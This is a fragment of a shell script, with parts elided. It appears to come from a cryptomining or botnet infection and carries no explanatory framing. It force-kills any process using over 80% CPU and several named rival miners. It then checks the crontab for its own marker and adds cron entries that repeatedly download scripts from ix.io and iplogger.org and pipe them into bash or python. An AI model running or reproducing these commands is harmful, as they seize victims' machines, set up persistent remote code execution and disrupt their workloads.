...
ps aux | grep -vw "pop" | grep -v grep | awk '{if($3>80.0) print $2}' | xargs -I % kill -9 %
...
killall -9 /tmp/sic/sic ; killall -9 /var/tmp/sic/sic
...
pgrep -f kdevtmpfsi|xargs -I % kill -9 %
pkill -f kdevtmpfsi
...
crontab -l |grep -e "23B1" | grep -v grep
if [ $? -eq 0 ]
then
echo "cron good"
else
...
echo "0,30 * * * * curl -sL http://ix.io/23AZ | bash -s" >> ~/cron || true && \
echo "0,45 * * * * curl -sL http://ix.io/23B1 | bash -s" >> ~/cron || true && \
echo "0 * * * * curl -sL https://iplogger.org/1H2he7 |  python - start --port=9061 --log=false" >> ~/cron || true && \
